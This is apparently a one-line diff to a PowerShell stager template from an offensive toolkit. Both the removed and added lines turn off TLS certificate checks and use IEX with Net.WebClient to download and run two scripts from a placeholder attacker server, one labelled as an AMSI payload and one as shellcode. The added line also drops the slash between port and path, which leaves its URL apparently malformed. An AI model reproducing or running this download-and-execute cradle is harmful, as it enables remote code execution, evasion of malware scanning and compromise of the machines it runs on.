@@ -1,1 +1,1 @@
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX ((new-object Net.WebClient).DownloadString('SCHEME://IP_WEBSERV:PORT_WEBSERV/PAYLOAD_AMSI'));IEX ((new-object Net.WebClient).DownloadString('SCHEME://IP_WEBSERV:PORT_WEBSERV/PAYLOAD_SHELLCODE'));
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX ((new-object Net.WebClient).DownloadString('SCHEME://IP_WEBSERV:PORT_WEBSERVPAYLOAD_AMSI'));IEX ((new-object Net.WebClient).DownloadString('SCHEME://IP_WEBSERV:PORT_WEBSERVPAYLOAD_SHELLCODE'));
